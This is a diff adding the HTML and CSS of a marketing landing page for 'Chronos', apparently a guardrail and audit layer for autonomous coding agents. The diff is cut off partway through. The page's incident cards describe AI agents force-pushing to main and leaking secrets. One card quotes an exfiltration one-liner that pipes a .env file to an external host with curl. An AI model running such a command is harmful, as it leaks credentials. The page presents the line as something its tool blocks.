+  background: radial-gradient(circle at center, #10212f 0%, #0d121c 70%);
+  border: 1px solid var(--border-focus);
+  border-radius: 16px;
+  padding: 64px 32px;
+  text-align: center;
+  box-shadow: 0 0 50px rgba(0, 242, 255, 0.1);
+  position: relative;
+  overflow: hidden;
+}
+
+.cta-title {
+  font-size: clamp(28px, 4vw, 44px);
+  font-weight: 900;
+  color: #fff;
+  margin-bottom: 16px;
+  letter-spacing: -0.02em;
+}
+
+.cta-subtitle {
+  font-size: 16px;
+  color: var(--text-dim);
+  max-width: 640px;
+  margin: 0 auto 36px;
+}
+
+/* Footer */
+.footer {
+  border-top: 1px solid var(--border-subtle);
+  background: #06070a;
+  padding: 64px 0 36px;
+  margin-top: 80px;
+  color: var(--muted);
+  font-size: 13px;
+}
+
+.footer-top {
+  display: grid;
+  grid-template-columns: 2fr repeat(3, 1fr);
+  gap: 40px;
+  margin-bottom: 48px;
+}
+
+.footer-brand-col {
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+.footer-tagline {
+  max-width: 280px;
+  font-size: 13px;
+  line-height: 1.6;
+  color: var(--text-dim);
+}
+
+.footer-col-title {
+  font-size: 12px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  color: #fff;
+  margin-bottom: 16px;
+  font-family: var(--mono);
+}
+
+.footer-links {
+  list-style: none;
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+.footer-link {
+  color: var(--muted);
+  transition: color 0.15s var(--ease);
+}
+.footer-link:hover {
+  color: var(--cyan);
+}
+
+.footer-bottom {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-top: 1px solid var(--border-subtle);
+  padding-top: 24px;
+  font-size: 12px;
+  flex-wrap: wrap;
+  gap: 12px;
+}
+
+/* Mobile Responsiveness */
+@media (max-width: 992px) {
+  .nav-links {
+    display: none;
+  }
+  .mobile-menu-toggle {
+    display: block;
+  }
+  .problem-grid, .pillars-grid {
+    grid-template-columns: 1fr;
+  }
+  .arch-flow {
+    grid-template-columns: 1fr;
+  }
+  .benchmark-stats-grid {
+    grid-template-columns: repeat(2, 1fr);
+  }
+  .calc-card {
+    grid-template-columns: 1fr;
+  }
+  .pricing-grid {
+    grid-template-columns: 1fr;
+  }
+  .footer-top {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+@media (max-width: 768px) {
+  .arch-diagram-wrapper {
+    padding: 18px 14px;
+  }
+  .arch-core {
+    padding: 16px 14px;
+  }
+  .arch-core-grid {
+    grid-template-columns: 1fr;
+  }
+  .benchmark-hero-banner {
+    padding: 18px 16px;
+  }
+  .benchmark-table-wrap {
+    padding: 12px;
+  }
+}
+
+@media (max-width: 640px) {
+  .container {
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+  .hero {
+    padding: 48px 0 36px;
+  }
+  .hero-stats-banner {
+    grid-template-columns: 1fr;
+  }
+  .install-bar {
+    flex-direction: column;
+    align-items: stretch;
+    gap: 10px;
+    padding: 12px 14px;
+    width: 100%;
+  }
+  .install-command {
+    word-break: break-all;
+    white-space: normal;
+    font-size: 11px;
+    line-height: 1.5;
+  }
+  .benchmark-stats-grid {
+    grid-template-columns: 1fr;
+  }
+  .bm-stat {
+    border-right: none;
+    border-bottom: 1px solid var(--border);
+    padding: 18px 14px;
+  }
+  .bm-stat:last-child {
+    border-bottom: none;
+  }
+  .calc-card {
+    padding: 20px 14px;
+    gap: 24px;
+  }
+  .calc-output {
+    padding: 20px 14px;
+  }
+  .calc-metric-val {
+    font-size: 24px;
+  }
+  .pillar-card {
+    padding: 22px 16px;
+  }
+  .pricing-card {
+    padding: 24px 18px;
+  }
+  .cta-banner {
+    padding: 36px 16px;
+  }
+  .sim-terminal-body {
+    padding: 14px 12px;
+    font-size: 11px;
+  }
+  .sim-topbar {
+    padding: 8px 10px;
+    flex-wrap: wrap;
+    gap: 8px;
+  }
+  .sim-tabs {
+    flex-wrap: wrap;
+  }
+  .sim-tab-btn {
+    padding: 4px 8px;
+    font-size: 11px;
+  }
+  .footer-top {
+    grid-template-columns: 1fr;
+    gap: 28px;
+  }
+  .rule-item {
+    flex-direction: column;
+    align-items: flex-start;
+    padding: 14px 16px;
+  }
+  .rule-id {
+    min-width: unset;
+  }
+  .rule-main {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 6px;
+  }
+  .faq-question {
+    padding: 16px 18px;
+    font-size: 14px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="bg-grid-overlay"></div>
+<div class="ambient-glow"></div>
+
+<!-- Navigation Header -->
+<header class="header">
+  <div class="container">
+    <div class="nav-container">
+      <a href="#" class="brand">
+        <div class="logo-cube">C</div>
+        <div class="brand-text">
+          <span class="brand-title">CHRONOS</span>
+          <span class="brand-subtitle">Control Plane</span>
+        </div>
+      </a>
+
+      <ul class="nav-links">
+        <li><a href="#problem" class="nav-link">The Crisis</a></li>
+        <li><a href="#architecture" class="nav-link">Architecture</a></li>
+        <li><a href="#guardrails" class="nav-link">Guardrails</a></li>
+        <li><a href="#locking" class="nav-link">AST Locking</a></li>
+        <li><a href="#benchmarks" class="nav-link">Benchmarks</a></li>
+        <li><a href="#calculator" class="nav-link">ROI Calc</a></li>
+        <li><a href="#pricing" class="nav-link">Pricing</a></li>
+        <li><a href="#faq" class="nav-link">FAQ</a></li>
+      </ul>
+
+      <div class="nav-actions">
+        <a href="https://github.com/AdithyaK3106/Chronos" target="_blank" rel="noopener noreferrer" class="btn btn-outline btn-sm">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+          GitHub
+        </a>
+        <a href="#quickstart" class="btn btn-primary btn-sm">
+          Deploy Local
+        </a>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="container hero-inner">
+    <div class="hero-badge-row">
+      <span class="badge badge-cyan">v1.2 Production Ready</span>
+      <span class="badge badge-violet">Claude Code Hook Compatible</span>
+      <span class="badge badge-green">Zero Model Latency (Local AST)</span>
+    </div>
+
+    <h1 class="hero-headline">
+      The AI Engineering Control Plane for <span class="accent">Autonomous Coding Agents</span>
+    </h1>
+
+    <p class="hero-subtitle">
+      Stop rogue force-pushes, prevent secret exfiltration, and eliminate multi-agent merge collisions. Chronos provides sub-file AST intent locking, deterministic shell guardrails, and cryptographic provenance—cutting agent context tokens by <strong>78.7%</strong>.
+    </p>
+
+    <div class="hero-cta-group">
+      <div class="install-bar">
+        <span class="install-command"><span class="prompt">$ </span>curl -fsSL https://raw.githubusercontent.com/AdithyaK3106/Chronos/master/install.sh | bash</span>
+        <button class="copy-btn" onclick="copyInstallCmd(this)">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+          Copy
+        </button>
+      </div>
+      <a href="#demo" class="btn btn-outline btn-lg">View Live Defense</a>
+    </div>
+
+    <!-- Live Terminal Simulator -->
+    <div class="sim-container" id="demo">
+      <div class="sim-topbar">
+        <div class="sim-dots">
+          <span class="sim-dot red"></span>
+          <span class="sim-dot yellow"></span>
+          <span class="sim-dot green"></span>
+        </div>
+        <div class="sim-tabs">
+          <button class="sim-tab-btn active" id="tab-chronos" onclick="switchSimTab('chronos')">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            Chronos Protected (Safe)
+          </button>
+          <button class="sim-tab-btn" id="tab-unprotected" onclick="switchSimTab('unprotected')">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
+            Unprotected Agent (Catastrophe)
+          </button>
+        </div>
+      </div>
+      <div class="sim-terminal-body" id="sim-body">
+        <!-- Rendered dynamically by JS -->
+      </div>
+    </div>
+
+    <!-- Hero Stats Banner -->
+    <div class="hero-stats-banner">
+      <div class="stat-pill">
+        <div class="stat-number"><span class="highlight">-78.7</span>%</div>
+        <div class="stat-label">Measured Context Tokens</div>
+      </div>
+      <div class="stat-pill">
+        <div class="stat-number"><span class="highlight">&lt; 2.5</span>ms</div>
+        <div class="stat-label">Local Hook Latency</div>
+      </div>
+      <div class="stat-pill">
+        <div class="stat-number"><span class="highlight">80</span>+</div>
+        <div class="stat-label">Deterministic Threat Rules</div>
+      </div>
+      <div class="stat-pill">
+        <div class="stat-number"><span class="highlight">100</span>%</div>
+        <div class="stat-label">Tamper-Evident Provenance</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- The Problem Section -->
+<section class="section section-alt" id="problem">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">THE PROBLEM</span>
+      <h2 class="section-title">Autonomous Coding Agents Create Unmanaged Enterprise Risk</h2>
+      <p class="section-desc">
+        Modern agents can build features and run tests independently. But when you give them shell execution and file write capabilities across mission-critical codebases, fatal incidents become inevitable.
+      </p>
+    </div>
+
+    <div class="problem-grid">
+      <div class="problem-card">
+        <div class="problem-icon-row">
+          <div class="icon-box">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+          </div>
+          <span class="badge badge-red">Critical Incident</span>
+        </div>
+        <h3 class="problem-title">Accidental Repo & History Destruction</h3>
+        <p class="problem-desc">
+          When asked to "tidy git history", models like Sonnet force-push rewritten trees directly to <code>main</code>, overwriting production code and wiping commit lineage.
+        </p>
+        <div class="problem-quote">
+          Incident: git push --force origin main (Overwrote 142 team commits)
+        </div>
+      </div>
+
+      <div class="problem-card">
+        <div class="problem-icon-row">
+          <div class="icon-box">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#f59e0b" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          </div>
+          <span class="badge badge-amber">Data Exfiltration</span>
+        </div>
+        <h3 class="problem-title">Secret & Token Leakage</h3>
+        <p class="problem-desc">
+          A routine prompt ("debug payment timeout") causes agents to inspect <code>.env</code>, <code>id_rsa</code>, or AWS config, sending plaintext production credentials to external model providers.
+        </p>
+        <div class="problem-quote">
+          Incident: cat .env | curl -X POST https://api.external.com/log
+        </div>
+      </div>
+
+      <div class="problem-card">
+        <div class="problem-icon-row">
+          <div class="icon-box">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" stroke-width="2"><circle cx="18" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><path d="M13 6h3a2 2 0 0 1 2 2v7"></path><line x1="6" y1="9" x2="6" y2="21"></line></svg>
+          </div>
+          <span class="badge badge-violet">Concurrency Failure</span>
+        </div>
+        <h3 class="problem-title">Multi-Agent Edit Collisions</h3>
+        <p class="problem-desc">
+          When deploying multiple agents across the same repository, coarse file locks block collaboration, while no locking causes silent race conditions, corrupted ASTs, and git merge hell.
+        </p>
+        <div class="problem-quote">
+          Incident: Agent-A overwrote Agent-B changes on line 210 of checkout.py
+        </div>
+      </div>
+
+      <div class="problem-card">
+        <div class="problem-icon-row">
+          <div class="icon-box">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00f2ff" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"></line><line x1="12" y1="20" x2="12" y2="4"></line><line x1="6" y1="20" x2="6" y2="14"></line></svg>
+          </div>
+          <span class="badge badge-cyan">Budget Drain</span>
+        </div>
+        <h3 class="problem-title">Context Window & Token Waste</h3>
+        <p class="problem-desc">
+          Agents waste up to 80% of token context running speculative <code>ls</code>, <code>find</code>, and whole-file reads before finding the 15 lines of code their prompt actually touches.
+        </p>
+        <div class="problem-quote">
+          Measured: 254,392 bytes sent when only 54,200 bytes were needed.
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Architecture Flow Section -->
+<section class="section" id="architecture">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">HOW IT WORKS</span>
+      <h2 class="section-title">The Runtime Interceptor Between Agents and Code</h2>
+      <p class="section-desc">
+        Chronos sits directly on the agent's tool execution loop. Before every <code>PreToolUse</code>, <code>PostToolUse</code>, and <code>UserPromptSubmit</code>, Chronos validates commands with zero external model calls.
+      </p>
+    </div>
+
+    <div class="arch-diagram-wrapper">
+      <div class="arch-flow">
+        <!-- Col 1: Agents -->
+        <div class="arch-col">
+          <span class="arch-col-title">Autonomous Agents</span>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path></svg>
+            Claude Code CLI
+          </div>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+            OpenHands Runner
+          </div>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 14 14"></polyline></svg>
+            Devin / Cursor / Custom
+          </div>
+        </div>
+
+        <!-- Col 2: Chronos Core -->
+        <div class="arch-core">
+          <div class="arch-core-header">
+            <div>
+              <span class="badge badge-cyan">Chronos Control Plane</span>
+              <strong style="display:block; font-size:16px; margin-top:4px; color:#fff;">Deterministic Runtime Engine</strong>
+            </div>
+            <span class="badge badge-green">&lt; 2.5ms Local Evaluation</span>
+          </div>
+
+          <div class="arch-core-grid">
+            <div class="core-module">
+              <div class="core-module-title">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+                Bi-Temporal AST Graph
+              </div>
+              <div class="core-module-desc">Tree-sitter SQLite index for structural symbol and call-hierarchy resolution.</div>
+            </div>
+
+            <div class="core-module">
+              <div class="core-module-title">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                AST Intent Locker
+              </div>
+              <div class="core-module-desc">Sub-file granular locks at the function & class level with atomic lease management.</div>
+            </div>
+
+            <div class="core-module">
+              <div class="core-module-title">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                Deterministic Policy Gate
+              </div>
+              <div class="core-module-desc">ast-grep structural patterns + OPA rules enforcing 80+ security checks.</div>
+            </div>
+
+            <div class="core-module">
+              <div class="core-module-title">
+                <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line></svg>
+                Provenance Ledger
+              </div>
+              <div class="core-module-desc">Cryptographically hash-chained audit log for SOC2 & GRC compliance.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Col 3: Repositories -->
+        <div class="arch-col">
+          <span class="arch-col-title">Protected Environment</span>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+            Production Git Repos
+          </div>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>
+            CI/CD Pipelines
+          </div>
+          <div class="arch-node">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="1" x2="12" y2="23"></line><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+            Audit & SIEM Systems
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- The 4 Core Pillars Section -->
+<section class="section section-alt" id="guardrails">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">FOUR PILLARS OF CONTROL</span>
+      <h2 class="section-title">Built for Mission-Critical Engineering</h2>
+      <p class="section-desc">
+        Complete operational oversight for teams deploying autonomous agents at scale.
+      </p>
+    </div>
+
+    <div class="pillars-grid">
+      <!-- Pillar 1 -->
+      <div class="pillar-card">
+        <div class="pillar-header">
+          <div class="pillar-icon-box">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+          </div>
+          <div>
+            <h3 class="pillar-title">Deterministic Guardrails & Shell Firewall</h3>
+            <span class="pillar-subtitle">No Prompt Injection Bypass</span>
+          </div>
+        </div>
+        <p class="pillar-body">
+          Chronos analyzes Bash commands, pipes, heredocs, subshells, and file operations against 80+ threat rules. If an agent tries to read a <code>.env</code> file or push to <code>main</code>, Chronos denies it or prompts for human approval.
+        </p>
+        <ul class="pillar-feature-list">
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            AST-level shell command inspection (detects encoded payload execution).
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Automatic redaction of secret files (<code>*.env*</code>, <code>id_rsa</code>, keys).
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Protects critical policies and CI workflows from agent modification.
+          </li>
+        </ul>
+        <div class="pillar-snippet">
+          deny | [Chronos] Bash command names secret file: .env [rule secret.env_read]
+        </div>
+      </div>
+
+      <!-- Pillar 2 -->
+      <div class="pillar-card" id="locking">
+        <div class="pillar-header">
+          <div class="pillar-icon-box">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--violet)" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+          </div>
+          <div>
+            <h3 class="pillar-title">Sub-File AST Intent Locking</h3>
+            <span class="pillar-subtitle">True Multi-Agent Parallelism</span>
+          </div>
+        </div>
+        <p class="pillar-body">
+          Traditional Git file locks force agents into serial bottlenecks. Chronos locks at the sub-file AST node level (individual functions, classes, and handlers), enabling dozens of agents to work in the same file without collisions.
+        </p>
+        <ul class="pillar-feature-list">
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Granular AST leases prevent merge collisions before diffs are generated.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Heartbeat leasing and automatic TTL expiry prevent permanent deadlocks.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Call-graph blast radius check flags downstream affected callers.
+          </li>
+        </ul>
+        <div class="pillar-snippet">
+          lock | [Chronos] Acquired node lease: BankingEngine.createAccount() [Agent-01]
+        </div>
+      </div>
+
+      <!-- Pillar 3 -->
+      <div class="pillar-card">
+        <div class="pillar-header">
+          <div class="pillar-icon-box">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"></polygon><polyline points="2 17 12 22 22 17"></polyline><polyline points="2 12 12 17 22 12"></polyline></svg>
+          </div>
+          <div>
+            <h3 class="pillar-title">Zero-Path Bi-Temporal Code Context</h3>
+            <span class="pillar-subtitle">78.7% Token Reduction</span>
+          </div>
+        </div>
+        <p class="pillar-body">
+          Before each prompt reaches the agent, Chronos automatically determines the exact symbols, caller hierarchies, and unit tests needed from a high-speed local tree-sitter graph.
+        </p>
+        <ul class="pillar-feature-list">
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Cuts token consumption by ~78% by eliminating greedy directory crawls.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Sub-3 millisecond structural symbol resolution directly on developer laptops.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Tracks historical diff lineage across commits to understand why code changed.
+          </li>
+        </ul>
+        <div class="pillar-snippet">
+          context | Injected 14 symbol ASTs (54KB) into prompt. Saved 200KB context.
+        </div>
+      </div>
+
+      <!-- Pillar 4 -->
+      <div class="pillar-card">
+        <div class="pillar-header">
+          <div class="pillar-icon-box">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--amber)" stroke-width="2"><line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line></svg>
+          </div>
+          <div>
+            <h3 class="pillar-title">Cryptographic Provenance & Audit</h3>
+            <span class="pillar-subtitle">Enterprise SOC2 & GRC Ready</span>
+          </div>
+        </div>
+        <p class="pillar-body">
+          Every single agent decision, prompt, tool execution, and denied violation is cryptographically signed into an immutable, hash-chained ledger stored outside the repo.
+        </p>
+        <ul class="pillar-feature-list">
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            <code>chronos audit verify</code> detects any post-facto tampering.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Tracks exact agent session ID, human approver, and git commit SHA.
+          </li>
+          <li class="pillar-feature-item">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            Export compliance logs to Splunk, Datadog, or S3 bucket.
+          </li>
+        </ul>
+        <div class="pillar-snippet">
+          audit | Verified 1,482 blocks. Hash chain integrity: 100% VALID
+        </div>
+      </div>
+    </div>
+
+    <!-- AST Sub-File Intent Locking Interactive Visualizer -->
+    <div class="ast-lock-viz">
+      <div class="ast-viz-bar">
+        <div class="ast-file-tab">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline></svg>
+          <code>BankingEngine.java</code> — Live AST Lease Map
+        </div>
+        <span class="badge badge-violet">Granular Sub-File Lock Active</span>
+      </div>
+
+      <div class="ast-code-container">
+        <span class="term-muted">// Multi-agent coordination: Two agents writing same file without collision</span>
+
+        <div class="ast-node-block ast-node-locked-1">
+          <span class="ast-tag badge-violet">LOCKED BY AGENT-01 (Modernization)</span>
+          <code>public Account createAccount(String customerId, BigDecimal initialBalance) {</code><br>
+          <span class="term-muted">&nbsp;&nbsp;// Enforces KYC balance invariants from COBOL ACCTMGMT...</span><br>
+          <code>}</code>
+        </div>
+
+        <div class="ast-node-block ast-node-available">
+          <span class="ast-tag badge-green">AVAILABLE FOR MODIFICATION</span>
+          <code>public boolean checkOFAC(String entityName) {</code><br>
+          <span class="term-muted">&nbsp;&nbsp;// Open AST node — Ready for Agent-03 to lease safely</span><br>
+          <code>}</code>
+        </div>
+
+        <div class="ast-node-block ast-node-locked-2">
+          <span class="ast-tag badge-cyan">LOCKED BY AGENT-02 (Audit Bugfix)</span>
+          <code>public void postTransaction(Transaction txn) {</code><br>
+          <span class="term-muted">&nbsp;&nbsp;// Double-entry balance check (Debits == Credits)</span><br>
+          <code>}</code>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- Enterprise Benchmarks & Case Study -->
+<section class="section" id="benchmarks">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">REAL-WORLD VERIFICATION</span>
+      <h2 class="section-title">Proven on Enterprise Production Modernization</h2>
+      <p class="section-desc">
+        We stress-tested Chronos on an authentic enterprise modernization benchmark: migrating a legacy COBOL core banking system to Java 17 under automated multi-agent governance.
+      </p>
+    </div>
+
+    <div class="benchmark-box">
+      <div class="benchmark-hero-banner">
+        <div>
+          <h3 class="benchmark-title">COBOL Core Banking Modernization → Java 17</h3>
+          <span class="benchmark-repo">Repository: NSEvent/cobol-banking-system · 31,882 Lines · 25 Production Modules</span>
+        </div>
+        <span class="badge badge-green">30/30 Differential Scenarios Matched (100%)</span>
+      </div>
+
+      <div class="benchmark-stats-grid">
+        <div class="bm-stat">
+          <div class="bm-delta">-78.69%</div>
+          <div class="bm-flow">254,392 B ➔ 54,200 B</div>
+          <div class="bm-label">Source-Context Token Volume</div>
+        </div>
+
+        <div class="bm-stat">
+          <div class="bm-delta">-98.79%</div>
+          <div class="bm-flow">0.2224 s ➔ 0.0027 s</div>
+          <div class="bm-label">Structural Analysis Time</div>
+        </div>
+
+        <div class="bm-stat">
+          <div class="bm-delta">-72.09%</div>
+          <div class="bm-flow">43 Reads ➔ 12 Reads</div>
+          <div class="bm-label">Full File Reads by Agent</div>
+        </div>
+
+        <div class="bm-stat">
+          <div class="bm-delta">100%</div>
+          <div class="bm-flow">25 / 25 Modules Verified</div>
+          <div class="bm-label">Behavioral Invariant Equivalence</div>
+        </div>
+      </div>
+
+      <div class="benchmark-table-wrap">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>COBOL Module</th>
+              <th>Business Invariant Preserved</th>
+              <th>Java 17 Target</th>
+              <th>Differential Verification</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>ACCTMGMT</code></td>
+              <td>Account lifecycle & validation limits</td>
+              <td><code>BankingEngine.createAccount()</code></td>
+              <td><span class="badge badge-green">VERIFIED</span></td>
+            </tr>
+            <tr>
+              <td><code>GLPOST0</code></td>
+              <td>Double-entry accounting (Debits == Credits)</td>
+              <td><code>BankingEngine.postTransaction()</code></td>
+              <td><span class="badge badge-green">VERIFIED</span></td>
+            </tr>
+            <tr>
+              <td><code>INTCALC0</code></td>
+              <td>Daily interest accrual (P * r / 365, HALF-UP)</td>
+              <td><code>BankingEngine.calculateDailyInterest()</code></td>
+              <td><span class="badge badge-green">VERIFIED</span></td>
+            </tr>
+            <tr>
+              <td><code>OFACCHK0</code></td>
+              <td>OFAC SDN sanctions list fuzzy matching</td>
+              <td><code>BankingEngine.checkOFAC()</code></td>
+              <td><span class="badge badge-green">VERIFIED</span></td>
+            </tr>
+            <tr>
+              <td><code>TXNPOST0</code></td>
+              <td>Transaction posting & BSA/AML limits</td>
+              <td><code>BankingEngine.postTransaction()</code></td>
+              <td><span class="badge badge-green">VERIFIED</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Interactive Threat Rule & Policy Explorer -->
+<section class="section section-alt">
+  <div class="container">
+    <div class="section-header">
